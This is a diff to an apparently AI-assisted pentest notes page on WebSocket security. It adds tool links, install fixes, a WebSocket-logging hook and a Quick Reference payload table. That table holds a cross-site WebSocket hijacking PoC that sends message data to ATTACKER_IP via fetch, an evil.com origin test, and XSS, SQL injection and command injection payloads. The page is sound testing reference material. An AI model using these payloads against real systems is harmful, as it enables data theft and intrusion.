@@ -8,6 +8,8 @@ WebSockets provide a **persistent, full-duplex** communication channel over a si
 
 **Common uses:** live chat, real-time dashboards, trading platforms, multiplayer games, live notifications, collaborative tools.
 
+Pairs with [[Web Attacks]], [[Cross-Site Scripting (XSS)]], [[CORS Misconfiguration]].
+
 ### The Handshake
 
 WebSocket connections start as HTTP, then upgrade:
@@ -47,10 +49,13 @@ After the `101 Switching Protocols` response, the connection is a WebSocket — 
 
 | Tool | Purpose |
 |---|---|
-| `Burp Suite` | WS history, Repeater, Intruder — intercept + fuzz |
-| `wscat` | CLI WebSocket client — manual interaction |
-| `websocat` | Versatile WS client — scripting + fuzzing |
+| `Burp Suite` | WS history, Repeater, Intruder — intercept + fuzz + CSWSH testing |
+| [`wscat`](https://github.com/websockets/wscat) | CLI WebSocket client — connect, send, receive |
+| [`websocat`](https://github.com/vi/websocat) | Versatile WS client — scripting + fuzzing, pipe-friendly |
+| [`WSSiP`](https://github.com/nccgroup/wssip) | WS proxy for intercept/modify |
+| [`STEWS`](https://github.com/PalindromeLabs/STEWS) | WS security testing framework — fingerprint + vuln scan |
 | `OWASP ZAP` | Active WebSocket scanning |
+| Browser DevTools | Network tab → WS — inspect frames in real time |
 
 ---
 
@@ -87,8 +92,9 @@ wscat -c wss://target.com/chat
 ### websocat (Kali alternative)
 
 ```bash
-# Install
-apt install websocat
+# Install (not in default apt — use cargo or a prebuilt release binary)
+cargo install websocat
+# or: wget https://github.com/vi/websocat/releases/latest/download/websocat.x86_64-unknown-linux-musl -O /usr/local/bin/websocat && chmod +x /usr/local/bin/websocat
 
 # Connect
 websocat ws://target.com/chat
@@ -325,7 +331,7 @@ while true; do echo '{"msg":"x"}' | websocat ws://target.com/chat; done
 
 ---
 
-### 6. WebSocket Smuggling (HTTP Upgrade Abuse)
+### 8. WebSocket Smuggling (HTTP Upgrade Abuse)
 
 Some reverse proxies (nginx, HAProxy) can be tricked into upgrading a non-WebSocket request, allowing smuggling of HTTP requests through the WS tunnel to bypass access controls.
 
@@ -391,25 +397,35 @@ Some reverse proxies (nginx, HAProxy) can be tricked into upgrading a non-WebSoc
 curl -s http://target.com/app.js | grep -oE 'ws[s]?://[^"'\'']+'
 curl -s http://target.com/app.js | grep -iE 'new WebSocket|WebSocket\('
 
-# In browser DevTools console
-Array.from(performance.getEntries()).filter(e => e.initiatorType === 'websocket')
+# In browser DevTools: use the Network tab → "WS" filter (WebSockets do NOT appear
+# in the Resource Timing API, so performance.getEntries() won't list them).
+# To log every WS the page opens, hook the constructor before the app runs:
+const _WS = window.WebSocket;
+window.WebSocket = function(url, ...a){ console.log('[WS]', url); return new _WS(url, ...a); };
 ```
 
 ---
 
-## Tools
+## Quick Reference
 
-| Tool | Use |
-|------|-----|
-| Burp Suite | Intercept, modify, replay WS frames; CSWSH testing |
-| [wscat](https://github.com/websockets/wscat) | CLI WS client — connect, send, receive |
-| [websocat](https://github.com/vi/websocat) | Versatile CLI WS client, pipe-friendly |
-| [WSSiP](https://github.com/nccgroup/wssip) | WS proxy for intercept/modify |
-| [STEWS](https://github.com/PalindromeLabs/STEWS) | WS security testing framework — fingerprint + vuln scan |
-| Browser DevTools | Network tab → WS — inspect frames in real time |
+| Goal | Payload / Command |
+|---|---|
+| Connect (CLI) | `wscat -c ws://target.com/chat -H "Cookie: session=<token>"` |
+| Send message from stdin | `echo '{"action":"getUsers"}' \| websocat ws://target.com/chat` |
+| Test CSWSH (arbitrary origin) | `curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" -H "Origin: https://evil.com" http://target.com/ws` |
+| CSWSH PoC | `var ws = new WebSocket('wss://target.com/chat'); ws.onmessage = e => fetch('http://ATTACKER_IP/log?data='+btoa(e.data));` |
+| XSS in message | `{"message": "<img src=x onerror=alert(document.cookie)>"}` |
+| SQLi in message | `{"action": "getUser", "id": "1' OR '1'='1"}` |
+| Command injection in message | `{"cmd": "ping", "host": "127.0.0.1; id"}` |
+| SSTI probe in message | `{"template": "{{7*7}}"}` |
+| IDOR / auth bypass | Replay with low-priv session, send `{"action": "getUser", "userId": "1"}` |
+| Race condition (redeem twice) | Send identical WS messages from parallel threads (see Python race snippet) |
+| Protocol downgrade test | `wscat -c ws://target.com/chat` (instead of `wss://`) — 101 response = plaintext accepted |
+| Find WS endpoints in JS | `curl -s http://target.com/app.js \| grep -oE 'ws[s]?://[^"'\'']+'` |
+| Hook WebSocket constructor (browser) | `window.WebSocket = function(url,...a){console.log('[WS]',url); return new _WS(url,...a);}` |
 
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-05-14*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-07-27*
+*Model: claude-sonnet-5*
